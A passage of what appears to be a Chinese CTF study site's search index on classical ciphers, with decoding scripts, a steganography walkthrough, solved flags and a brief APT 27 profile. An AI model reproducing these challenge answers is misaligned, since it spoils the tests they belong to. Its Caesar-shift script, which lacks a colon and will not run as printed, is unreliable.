\u82e5\u8bd7\u6b4c\u4e2d\u65e0<code>T</code>\uff0c\u53ef\u8df3\u8fc7\u6216\u7ea6\u5b9a\u9ed8\u8ba4\u503c\uff08\u59820\uff09\u2192 \u9700\u8bd7\u6b4c\u5305\u542b\u8db3\u591f\u5b57\u6bcd    \uff08\u5047\u8bbe\u8bd7\u6b4c\u6269\u5c55\u540e <code>T</code> \u5bf9\u5e94\u6570\u5b57\u4e3a20\uff09</li> <li>\u6700\u7ec8\u5bc6\u94a5\u5e8f\u5217\uff1a<code>[3, 20, 20, 3, 7, ?]</code></li> </ul> </li> <li>\u5b57\u6bcd\u4f4d\u79fb\uff08\u7c7b\u4f3c\u51ef\u6492\u5bc6\u7801\uff09\uff1a</li> <li>\u5c06\u660e\u6587\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u5411\u540e\u79fb\u52a8\u5bc6\u94a5\u6570\u5b57\u5bf9\u5e94\u7684\u4f4d\u6570\uff08\u6a21 26\uff09<ul> <li><code>A (1) + 3 = D (4)</code></li> <li><code>T (20) + 20 = 40 \u2192 40 - 26 = 14 \u2192 N (14)</code></li> <li>\u6700\u7ec8\u5bc6\u6587\uff1a<code>D N N D H ?</code></li> </ul> </li> </ol> <p>\u89e3\u5bc6\u8fc7\u7a0b</p> <p>\u89e3\u5bc6\u8005\u4f7f\u7528\u76f8\u540c\u7684\u8bd7\u6b4c\u5bc6\u94a5\uff0c\u53cd\u5411\u64cd\u4f5c\uff1a</p> <ol> <li>\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u6570\u5b57\u5e8f\u5217 <code>[3, 20, 20, 3, 7, ?]</code></li> <li>\u5c06\u5bc6\u6587\u5b57\u6bcd\u5411\u524d\u79fb\u52a8\u5bc6\u94a5\u6570\u5b57\u4f4d\uff1a</li> <li><code>D (4) - 3 = A (1)</code></li> <li><code>N (14) - 20 = -6 \u2192 26 - 6 = 20 \u2192 T (20)</code></li> </ol> <p>GitHub\u4e0a\u6709\u73b0\u6210\u811a\u672c</p> <p>\u5c06\u8bd7\u53e5\u5b58\u50a8\u6210 poem.txt\uff08\u8bb0\u5f97\u5220\u9664\u91cc\u9762\u7684\u6807\u70b9\uff09</p> <p>\u5c06\u89e3\u5bc6\u4fe1\u606f\u5b58\u50a8\u6210 cip.txt</p> <pre><code>python2 poemcode.py poem.txt cip.txt\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-2/","title":"\u6469\u65af\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-2/#\u6469\u65af\u5bc6\u7801","title":"\u6469\u65af\u5bc6\u7801","text":"<pre><code>A: .-\nB: -...\nC: -.-.\n\u2026\u2026\n</code></pre> <p>\u6469\u65af\u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u53ea\u6709\u77ed\u548c\u957f\u4e24\u79cd\u5f62\u5f0f\uff0c\u6bcf\u7ec4\u4e4b\u95f4\u90fd\u6709\u95f4\u9694\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-20/","title":"\u6d77\u55e3\u6587\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-20/#\u6d77\u55e3\u6587\u5bc6\u7801","title":"\u6d77\u55e3\u6587\u5bc6\u7801","text":"<p>\u62ff\u5230\u6587\u4ef6\u540e\u5148\u6539\u540e\u7f00</p> <p></p> <p>\u5c06\u6587\u4ef6\u540e\u7f00\u6539\u6210 PNG \u540e\u6253\u5f00\u8be5\u56fe\u7247</p> <p></p> <p>\u53ea\u663e\u793a\u4e86\u4e00\u534a\uff0c\u4fee\u6539\u5bbd\u9ad8</p> <p></p> <p>\u53d1\u73b0\u6709\u538b\u7f29\u6587\u4ef6</p> <p></p> <p>\u6253\u5f00 docx \u6587\u6863\uff0c<code>CTRL+A</code> \u5168\u9009\u540e\u4fee\u6539\u5b57\u4f53\u989c\u8272\uff0c\u5f97\u5230\u4e00\u5806\u4e8c\u8fdb\u5236\u6570\u636e</p> <p></p> <p>\u7528 01 to image \u811a\u672c\u8f6c\u6362\u6210\u56fe\u7247</p> <pre><code>import numpy as np  \nfrom PIL import Image  \n\ndef read_binary_image(file_path):  \n    # \u6253\u5f00\u5e76\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9  \n    with open(file_path, 'r') as file:  \n        binary_data = file.read()  \n\n    # \u6309\u884c\u5206\u5272\u4e8c\u8fdb\u5236\u6570\u636e  \n    lines = binary_data.split('\\n')  \n\n    # \u8fc7\u6ee4\u6389\u7a7a\u884c  \n    lines = [line for line in lines if line.strip()]  \n\n    # \u5047\u8bbe\u6bcf\u4e00\u884c\u4ee3\u8868\u4e00\u884c\u50cf\u7d20\uff0c\u6bcf\u4e2a\u5b57\u7b26\u662f\u4e00\u4e2a\u50cf\u7d20\uff080 \u6216 1\uff09  \n    # \u5c06\u6bcf\u4e00\u884c\u8f6c\u6362\u4e3a\u6574\u6570\u5217\u8868\uff080 \u6216 1\uff09  \n    pixel_rows = [list(map(int, line)) for line in lines]  \n\n    # \u786e\u5b9a\u56fe\u50cf\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6  \n    # \u5982\u679c pixel_rows \u4e0d\u4e3a\u7a7a\uff0c\u5219\u5bbd\u5ea6\u4e3a\u7b2c\u4e00\u884c\u7684\u957f\u5ea6\uff0c\u5426\u5219\u4e3a 0  \n    # \u9ad8\u5ea6\u4e3a pixel_rows \u7684\u957f\u5ea6  \n    width = len(pixel_rows[0]) if pixel_rows else 0  \n    height = len(pixel_rows)  \n\n    # \u521b\u5efa\u4e00\u4e2a NumPy \u6570\u7ec4\uff0c\u5f62\u72b6\u4e3a(height, width)\uff0c\u6570\u636e\u7c7b\u578b\u4e3a uint8  \n    image_array = np.array(pixel_rows, dtype=np.uint8)  \n\n    # \u7531\u4e8e PIL Image \u9700\u8981\u7279\u5b9a\u7684\u7ef4\u5ea6\uff08\u7070\u5ea6\u56fe\u50cf\u9700\u8981\u5f62\u72b6\u4e3a(height, width, 1)\uff09\uff0c\u4f46\u8fd9\u91cc\u6211\u4eec\u6682\u65f6\u4e0d\u9700\u8981\u6269\u5c55\u7ef4\u5ea6  \n    # \u56e0\u4e3a\u6211\u4eec\u7a0d\u540e\u4f1a\u5c06\u5176\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\uff0c\u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u5904\u7406\u4e3a\u5355\u901a\u9053\u5373\u53ef  \n    # \u6ce8\u610f\uff1a\u4e0b\u9762\u7684\u4ee3\u7801\u884c\u662f\u591a\u4f59\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u6b63\u786e\u7684\u5355\u901a\u9053\u6570\u7ec4\uff0c\u6240\u4ee5\u5c06\u5176\u6ce8\u91ca\u6389  \n    # image_array = np.stack((image_array,)*3, axis=-1)  # \u8fd9\u884c\u4ee3\u7801\u539f\u672c\u7528\u4e8e\u8f6c\u6362\u4e3aRGB\uff0c\u4f46\u4e0d\u9002\u7528\u4e8e\u6b64\u573a\u666f  \n    # image_array = image_array[:, :, 0]  # \u8fd9\u884c\u4ee3\u7801\u4f1a\u4e22\u5931\u6570\u636e\uff0c\u56e0\u4e3a\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u7070\u5ea6\u6570\u636e  \n\n    # \u76f4\u63a5\u4f7f\u7528 NumPy \u6570\u7ec4\u521b\u5efa PIL Image\uff0c\u4f46\u9700\u8981\u5148\u5c06\u5176\u503c\u6269\u5c55\u5230 0-255 \u8303\u56f4\uff08\u56e0\u4e3aPIL Image\u4f7f\u75288\u4f4d\u50cf\u7d20\u503c\uff09  \n    # \u7531\u4e8e\u6211\u4eec\u7684\u6570\u636e\u662f\u4e8c\u8fdb\u5236\uff080 \u6216 1\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u5c06 1 \u6620\u5c04\u5230 255\uff08\u767d\u8272\uff09  \n    image = Image.fromarray((image_array * 255).astype(np.uint8))  # \u786e\u4fdd\u8f6c\u6362\u4e3auint8\u7c7b\u578b\u4ee5\u5339\u914dPIL\u8981\u6c42  \n\n    # \u5c06\u56fe\u50cf\u8f6c\u6362\u4e3a\u7070\u5ea6\u6a21\u5f0f\uff08\u867d\u7136\u5b83\u5df2\u7ecf\u662f\u7070\u5ea6\u7684\uff0c\u4f46\u8fd9\u4e00\u6b65\u53ef\u4ee5\u786e\u4fdd\u56fe\u50cf\u4ee5\u6b63\u786e\u7684\u6a21\u5f0f\u663e\u793a\uff09  \n    # \u6ce8\u610f\uff1a\u5982\u679c\u4e0a\u9762\u7684\u6269\u5c55\u548c\u7c7b\u578b\u8f6c\u6362\u6b63\u786e\uff0c\u8fd9\u4e00\u6b65\u5176\u5b9e\u662f\u4e0d\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u7ed3\u679c\u5df2\u7ecf\u662f\u7070\u5ea6\u56fe\u4e86  \n    # \u4f46\u4e3a\u4e86\u4ee3\u7801\u7684\u6e05\u6670\u6027\u548c\u5b8c\u6574\u6027\uff0c\u6211\u8fd8\u662f\u4fdd\u7559\u4e86\u8fd9\u4e00\u6b65  \n    image = image.convert('L')  # \u8f6c\u6362\u4e3a\u7070\u5ea6\u6a21\u5f0f\uff08'L'\uff09  \n\n    return image  \n\n# \u793a\u4f8b\u7528\u6cd5  \nfile_path = '1.txt'  # \u66ff\u6362\u4e3a\u4f60\u7684\u6587\u4ef6\u8def\u5f84  \nimage = read_binary_image(file_path)  \nimage.show()  # \u663e\u793a\u56fe\u50cf  \nimage.save('output.png')  # \u4fdd\u5b58\u56fe\u50cf\n</code></pre> <p></p> <p>\u955c\u50cf\u7ffb\u8f6c</p> <p></p> <p>\u5bf9\u7167\u8868\u7ffb\u8bd1</p> <p></p> <p>\u5176\u4e2d\u7684 <code>\uff1f</code> \u7ffb\u8bd1\u4e3a <code>_</code> \uff08\u5728\u521a\u5f00\u59cb\u7684\u56fe\u7247\u4e0a\u6709\u63d0\u793a\uff09\u5f97\u5230</p> <pre><code>_thecrowdcalls_return_sufferingforever\n</code></pre> <p>\u5728\u6587\u6863\u4e2d\u8fd8\u6709\u4e00\u5f20\u56fe\u7247</p> <p></p> <p>\u7528\u76f2\u6c34\u5370\u5de5\u5177\u6253\u5f00\u5f97\u5230\u63d0\u793a</p> <p></p> <p>\u7b2c\u4e00\u6bb5 flag \u662f\u8fd9\u4e2a\uff0c\u6700\u540e\u62fc\u63a5\u5373\u53ef</p> <p></p>"},{"location":"Crypto/Chapter4/4-21/","title":"\u65e5\u671f\u7f51\u683c\u5750\u6807\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-21/#\u65e5\u671f\u7f51\u683c\u5750\u6807\u5bc6\u7801","title":"\u65e5\u671f\u7f51\u683c\u5750\u6807\u5bc6\u7801","text":"<p>\u9898\u76ee\u7ed9\u51fa\u4e86\u4e00\u5f20\u56fe\u7247</p> <p></p> <p>\u4ee5\u53ca\u4e00\u6bb5\u5b57\u7b26</p> <pre><code>SAT1,THU1,MON3,MON2,WED3,SUN2,THU1,SUN4,FRI3,THU1,MON4,MON4,FRI4,THU3,SUN4,SUN2,TUE4,THU1,FRI1,MON3,MON2\n</code></pre> <p>\u89c2\u5bdf\u6700\u540e\u7684\u6570\u5b57\u53ea\u6709 <code>1~4</code>\uff0c\u63a8\u6d4b\u8fd9\u5c31\u662f\u884c\u53f7\uff0c\u800c\u5b57\u7b26\u5c31\u662f\u5bf9\u5e94\u7684\u5217</p> <p>\u5c06\u5f97\u5230\u7684\u6570\u5b57\u6309\u7167\u5b57\u6bcd\u8868\u7684\u987a\u5e8f\u8f6c\u6362\u6700\u540e\u5f97\u5230</p> <pre><code>0xGame{calendarpasswordtable}\n</code></pre>"},{"location":"Crypto/Chapter4/4-3/","title":"\u51ef\u6492\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-3/#\u51ef\u6492\u5bc6\u7801","title":"\u51ef\u6492\u5bc6\u7801","text":"<p>\u51ef\u6492\u5bc6\u7801\u7684\u52a0\u5bc6\u8fc7\u7a0b\u975e\u5e38\u7b80\u5355\uff1a\u5bf9\u4e8e\u6bcf\u4e2a\u5b57\u6bcd\uff0c\u627e\u5230\u5b83\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u5c06\u5176\u79fb\u52a8\u56fa\u5b9a\u7684\u4f4d\u6570</p> <p>\u5047\u8bbe\u504f\u79fb\u91cf\u4e3a <code>n</code>\uff0c\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u66ff\u6362\u6210\u5b57\u6bcd\u8868\u4e2d\u5f80\u540e\u79fb\u52a8 <code>n</code> \u4f4d\u7684\u5b57\u6bcd</p> <p>\u52a0\u5bc6\u8fc7\u7a0b\uff1a</p> <pre><code>\u660e\u6587\u5b57\u6bcd P \u88ab\u66ff\u6362\u4e3a C\uff0c\u5176\u4e2d C \u4e3a\u660e\u6587\u5b57\u6bcd P \u5411\u540e\u79fb\u52a8\u56fa\u5b9a\u504f\u79fb\u91cf\uff08\u5982 3 \u4f4d\uff09\u7684\u5b57\u6bcd\n</code></pre> <p>\u89e3\u5bc6\u8fc7\u7a0b\uff1a</p> <pre><code>\u89e3\u5bc6\u65f6\uff0c\u6309\u7167\u52a0\u5bc6\u65f6\u7684\u504f\u79fb\u91cf\u53cd\u5411\u79fb\u52a8\u5b57\u6bcd\uff0c\u4ece\u800c\u6062\u590d\u539f\u6587\n</code></pre> <p>\u51ef\u6492\u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u53ea\u5c06\u5b57\u7b26\u4e32\u4e2d\u7684\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4f4d\u79fb\n\u5206\u522b\u5728 A-Z \u6216 a-z \u4e4b\u95f4\u5faa\u73af\n</code></pre> <p>\u8fd9\u91cc\u56e0\u4e3a\u5305\u542b\u7b26\u53f7\uff0c\u9700\u8981\u7528\u811a\u672c\u89e3</p> <pre><code>def main():\n    ciphertext = 'afZ_r9VYfScOeO_UL^RWUc'\n\n    j = 5\n\n    for i in ciphertext:\n        print(chr(ord(i) + j), end='')\n\n        j += 1\n\n\nif __name__ == '__main__'\n    main()\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-4/","title":"\u732a\u5708\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-4/#\u732a\u5708\u5bc6\u7801","title":"\u732a\u5708\u5bc6\u7801","text":"<p>\u732a\u5708\u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u7c7b\u4f3c \"\u732a\u5708\" \u6216\u8005 \"\u4ea4\u53c9\u7ebf\" \u7684\u56fe\u5f62\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-5/","title":"Quipqiup","text":""},{"location":"Crypto/Chapter4/4-5/#quipqiup","title":"Quipqiup","text":"<p>Quipqiup \u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u8f85\u52a9\u89e3\u5bc6\u66ff\u6362\u5bc6\u7801\u7684\u5de5\u5177\u6216\u7b97\u6cd5</p> <p>Quipqiup \u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u53ea\u66ff\u6362\u5b57\u6bcd\uff0c\u6570\u5b57\u6807\u70b9\u7b26\u53f7\u5747\u5ffd\u7565\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-6/","title":"\u4e0e\u4f5b\u8bba\u7985","text":""},{"location":"Crypto/Chapter4/4-6/#\u4e0e\u4f5b\u8bba\u7985","title":"\u4e0e\u4f5b\u8bba\u7985","text":"<p>\u524d\u9762\u9700\u8981\u7834\u89e3 ZIP \u4f2a\u52a0\u5bc6</p> <p>\u4e0e\u4f5b\u8bba\u7985\u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u4f5b\u66f0\u5f00\u5934\uff0c\u4e0e\u4f5b\u6587\u6709\u5173\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-7/","title":"Playfair","text":""},{"location":"Crypto/Chapter4/4-7/#playfair","title":"Playfair","text":"<p>Playfair \u5bc6\u7801\u5c06\u660e\u6587\u4ee5\u4e24\u4e24\u914d\u5bf9\u7684\u65b9\u5f0f\u52a0\u5bc6\uff0c\u5177\u4f53\u89c4\u5219\u5982\u4e0b\uff1a</p> <ol> <li> <p>\u51c6\u5907\u5bc6\u94a5\u77e9\u9635\uff1a</p> </li> <li> <p>\u5bc6\u94a5\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982 <code>KEYWORD</code></p> </li> <li>\u79fb\u9664\u91cd\u590d\u5b57\u6bcd\uff0c\u5e76\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09\u586b\u5145\u4e00\u4e2a 5x5 \u7684\u77e9\u9635</li> <li>\u5c06\u5b57\u6bcd <code>I</code> \u548c <code>J</code> \u5408\u5e76\u4e3a\u4e00\u4e2a\u5b57\u6bcd\uff08\u53ef\u4ee5\u4e92\u76f8\u66ff\u6362\uff09</li> <li>\u5269\u4f59\u5b57\u6bcd\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u4f9d\u6b21\u586b\u5165</li> </ol> <p>\u4f8b\u5982\uff0c\u5bc6\u94a5\u4e3a <code>KEYWORD</code> \u65f6\uff0c\u751f\u6210\u7684\u77e9\u9635\u4e3a\uff1a</p> <pre><code>K E Y W O\nR D A B C\nF G H I/J L\nM N P Q S\nT U V X Z\n</code></pre> <ol> <li> <p>\u5206\u7ec4\u660e\u6587\uff1a</p> </li> <li> <p>\u660e\u6587\u6309\u4e24\u4e2a\u5b57\u6bcd\u4e00\u7ec4\u5206\u7ec4\uff0c\u4f8b\u5982 <code>HELLO</code> -&gt; <code>HE LL Oz</code></p> </li> <li>\u5982\u679c\u4e24\u4e2a\u5b57\u6bcd\u76f8\u540c\uff08\u4f8b\u5982 <code>MEET</code> -&gt; <code>ME ET</code>\uff09\uff0c\u5728\u4e2d\u95f4\u63d2\u5165\u586b\u5145\u5b57\u6bcd <code>z</code> </li> <li> <p>\u5982\u679c\u6700\u540e\u4e00\u7ec4\u53ea\u6709\u4e00\u4e2a\u5b57\u6bcd\uff0c\u8865\u5145 <code>z</code>\uff08\u4f8b\u5982 <code>O</code> -&gt; <code>Oz</code>\uff09</p> </li> <li> <p>\u52a0\u5bc6\u89c4\u5219\uff1a</p> </li> <li> <p>\u540c\u4e00\u884c\uff1a</p> <ul> <li>\u5982\u679c\u4e00\u5bf9\u5b57\u6bcd\u5728\u540c\u4e00\u884c\uff0c\u5219\u7528\u5176\u53f3\u4fa7\u5b57\u6bcd\u4ee3\u66ff\uff1b\u884c\u5c3e\u7684\u5b57\u6bcd\u56de\u5230\u884c\u9996</li> <li>\u4f8b\u5982\uff1a<code>WE</code> -&gt; <code>OY</code></li> </ul> </li> <li>\u540c\u4e00\u5217\uff1a<ul> <li>\u5982\u679c\u4e00\u5bf9\u5b57\u6bcd\u5728\u540c\u4e00\u5217\uff0c\u5219\u7528\u5176\u4e0b\u65b9\u5b57\u6bcd\u4ee3\u66ff\uff1b\u5217\u5c3e\u7684\u5b57\u6bcd\u56de\u5230\u5217\u9996</li> <li>\u4f8b\u5982\uff1a<code>ED</code> -&gt; <code>DG</code></li> </ul> </li> <li>\u4e0d\u540c\u884c\u5217\uff1a<ul> <li>\u5982\u679c\u4e00\u5bf9\u5b57\u6bcd\u4e0d\u5728\u540c\u4e00\u884c\u6216\u5217\uff0c\u5219\u7528\u5176\u540c\u884c\u4e14\u4e0e\u540c\u7ec4\u53e6\u4e00\u5b57\u6bcd\u540c\u5217\u7684\u5b57\u6bcd\u4ee3\u66ff</li> <li>\u4f8b\u5982\uff1a<code>HE</code> -&gt; <code>GY</code></li> </ul> </li> </ol> <p>Playfair \u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u5bc6\u6587\u7684\u5b57\u6bcd\u6570\u4e00\u5b9a\u662f\u5076\u6570\uff0c\u4efb\u610f\u4e24\u4e2a\u540c\u7ec4\u7684\u5b57\u6bcd\u90fd\u4e0d\u4f1a\u76f8\u540c\uff0c\u5982\u679c\u51fa\u73b0\u8fd9\u79cd\u5b57\u7b26\u5fc5\u662f\u4e71\u7801\u548c\u865a\u7801\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-8/","title":"Base \u6362\u8868","text":""},{"location":"Crypto/Chapter4/4-8/#base-\u6362\u8868","title":"Base \u6362\u8868","text":"<p>\u7ed9\u51fa\u4e86 Base \u8868\u4ee5\u53ca\u5bc6\u6587</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u5148\u5c06\u5bc6\u6587\u5bf9\u7167\u7ed9\u51fa\u7684 Base \u8868\u8f6c\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u518d\u5c06\u6570\u5b57\u8f6c\u4e3a\u5b57\u7b26\uff0c\u6700\u540e\u89e3\u5bc6</p> <pre><code>import base64\n\n\ndef main():\n    dict1 = {0: 'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V', 10: 'z', 11: 'A', 12: 'B',\n             13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H', 19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I',\n             25: 'a', 26: 'b', 27: 'c', 28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h', 33: 'i', 34: 'j', 35: 'k', 36: 'l',\n             37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3', 46: '4', 47: '5', 48: '6',\n             49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p', 55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v',\n             61: 'w', 62: '+', 63: '/', 64: '='}\n\n    base64_list = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',\n                   'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n                   'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',\n                   '8', '9', '+', '/']\n\n    cipher = 'FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'\n\n    res = ''\n\n    # \u904d\u5386\u5bc6\u6587\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26 cipher[i]\n    for i in range(len(cipher)):\n        for j in range(64):\n            # \u5bf9\u6bcf\u4e2a\u5b57\u7b26 cipher[i]\uff0c\u904d\u5386 dict\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u6570\u5b57 j\uff0c\u5373\u627e\u5230 dict[j] == cipher[i]\n            if dict1[j] == cipher[i]:\n                # \u4f7f\u7528\u8fd9\u4e2a\u6570\u5b57 j \u4ece\u6807\u51c6 Base64 \u5b57\u7b26\u96c6 base64_list[j] \u4e2d\u53d6\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\uff0c\u5e76\u5c06\u5176\u52a0\u5165\u5230 res \u4e2d\n                res += base64_list[j]\n\n    print(base64.b64decode(res))\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Crypto/Chapter4/4-9/","title":"\u94f6\u6cb3\u5b57\u6bcd\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-9/#\u94f6\u6cb3\u5b57\u6bcd\u5bc6\u7801","title":"\u94f6\u6cb3\u5b57\u6bcd\u5bc6\u7801","text":"<p>\u94f6\u6cb3\u5b57\u6bcd\u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>\u591a\u4ee5\u70b9\u548c\u7ebf\u7ec4\u6210\u7684\u56fe\u5f62\n</code></pre> <p></p> <p>\u5bf9\u7167\u4e0a\u56fe\u89e3\u51fa rtuyo\uff08\u5176\u4f59\u90e8\u5206\u662f\u732a\u5708\uff09</p> <p></p>"},{"location":"Crypto/Chapter5/","title":"Index","text":""},{"location":"Crypto/Chapter5/#apt-27","title":"APT 27","text":"<p>\u8be5\u7ec4\u7ec7\u88ab\u897f\u65b9\u6000\u7591\u662f\u4e2d\u56fd\u7528\u6765\u9488\u5bf9\u897f\u65b9\u653f\u5e9c\u53d1\u52a8\u653b\u51fb\u7684\u4e2d\u56fd\u9ed1\u5ba2\u7ec4\u7ec7\u3001\u53d7\u5230\u4e2d\u56fd\u5b98\u65b9\u652f\u6301</p> <p>\u8be5\u7ec4\u7ec7\u66fe\u5bf9\u5168\u7403\u6570\u767e\u4e2a\u7ec4\u7ec7\uff0c\u5305\u62ec\u7f8e\u56fd\u56fd\u9632\u627f\u5305\u5546\u3001\u91d1\u878d\u670d\u52a1\u516c\u53f8\u3001\u6b27\u6d32\u65e0\u4eba\u673a\u5236\u9020\u5546\u4ee5\u53ca\u4e00\u5bb6\u6cd5\u56fd\u80fd\u6e90\u7ba1\u7406\u516c\u53f8\u5728\u7f8e\u56fd\u7684\u5b50\u516c\u53f8\u53d1\u52a8\u8fc7\u653b\u51fb 2018 \u5e74 6 \u6708 13 \u65e5\uff0c\u5361\u5df4\u65af\u57fa\u5b9e\u9a8c\u5ba4\u7684\u7814\u7a76\u4eba\u5458\u53d1\u8868\u6587\u7ae0\u8868\u793a\uff0c\u5176\u5728\u540c\u5e743\u6708\u4efd\u53d1\u73b0\u4e86\u4e00\u8d77\u9488\u5bf9\u67d0\u4e2d\u4e9a\u56fd\u5bb6\u6570\u636e\u4e2d\u5fc3\u7684\u6301\u7eed\u6027\u7f51\u7edc\u95f4\u8c0d\u6d3b\u52a8\uff0c\u76ee\u6807\u662f\u5728\u8be5\u56fd\u7684\u653f\u5e9c\u7f51\u7ad9\u4e0a\u5b9e\u65bd\u6c34\u5751\u653b\u51fb\uff0c\u4ee5\u83b7\u53d6\u5e7f\u6cdb\u7684\u653f\u5e9c\u8d44\u6e90\uff0c\u5176\u653b\u51fb\u884c\u52a8\u6700\u65e9\u53ef\u8ffd\u6eaf\u81f32017\u5e7411\u6708\u4e2d\u65ec\uff0c\u5e76\u8ba4\u4e3a\u8be5\u884c\u52a8\u51fa\u81ea APT 27 \u4e4b\u624b</p> <p>2019 \u5e74 4 \u6708\uff0c\u6d3e\u62d3\u7f51\u7edc Unit 42 \u53d1\u73b0 APT 27 \u5229\u5229\u7528\u4e86\u5fae\u8f6f SharePoint \u7684\u6f0f\u6d1e CVE-2019-0604 \u5728 Sharepoint \u670d\u52a1\u5668\u4e0a\u5b89\u88c5 China Chopper webshell \u6765\u653b\u51fb\u4e2d\u4e1c\u4e24\u4e2a\u653f\u5e9c\u7ec4\u7ec7</p> <p>\u636eSecNews\u4e8e2019\u5e745\u670830\u65e5\u7684\u62a5\u9053\uff0c\u5176\u4ee5\u68c0\u6d4b\u5230APT 27\u4ee5\u5927\u578b\u4f01\u4e1a\u7f51\u7edc\u4e3a\u76ee\u6807\uff0c\u5bf9 MySQL \u670d\u52a1\u5668\u8fdb\u884c\u4e8615,000\u6b21\u653b\u51fb</p> <p>2022\u5e741\u670826\u65e5\uff0c\u5fb7\u56fd\u8054\u90a6\u5baa\u6cd5\u4fdd\u536b\u5c40\u8868\u793a\u9ed1\u5ba2\u7ec4\u7ec7APT 27\u5df2\u5bf9\u5fb7\u56fd\u7684\u5236\u836f\u548c\u79d1\u6280\u516c\u53f8\u53d1\u52a8\u6301\u7eed\u653b\u51fb\uff0c\u800c\u8be5\u5c40\u6b64\u524d\u4e8e2019\u5e74\u7684\u4e00\u4efd\u62a5\u544a\u4e2d\u8868\u793aAPT 27\u53e6\u6709\u522b\u540d\u4e3a**\u718a\u732b\u4f7f\u8005**\uff0c\u6697\u793aAPT 27\u542b\u6709\u4e2d\u56fd\u80cc\u666f\uff0c\u5e76\u8868\u793a\u8be5\u7ec4\u7ec7\u5bf9\u5916\u56fd\u4f7f\u9986\u548c\u5173\u952e\u9886\u57df\u6784\u6210\u5a01\u80c1</p> <p>2022\u5e748\u67083\u65e5\uff0c\u4e00\u4e2a\u81ea\u79f0\u662fAPT 27\u7ec4\u7ec7\u7684YouTube\u9891\u9053\u4e0a\u4f20\u58f0\u660e\u89c6\u9891\uff0c\u8868\u793a\u53d7\u4f69\u6d1b\u897f\u8bbf\u53f0\u5f71\u54cd\uff0c\u5c06\u5bf9\u53f0\u6e7e\u53d1\u52a8\u7279\u522b\u7f51\u7edc\u884c\u52a8\uff0c\u653b\u51fb\u76ee\u6807\u4e3a\u53f0\u6e7e\u7684\u653f\u5e9c\u7f51\u7ad9\u4e0e\u57fa\u7840\u8bbe\u65bd</p> <p></p>"},{"location":"Crypto/Chapter5/5-1/","title":"\u6805\u680f\u5bc6\u7801","text":""},{"location":"Crypto/Chapter5/5-1/#\u6805\u680f\u5bc6\u7801","title":"\u6805\u680f\u5bc6\u7801","text":"<p>\u6805\u680f\u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u6805\u680f\u5bc6\u7801\uff0c\u5c31\u662f\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210N\u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c1\u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\n</code></pre> 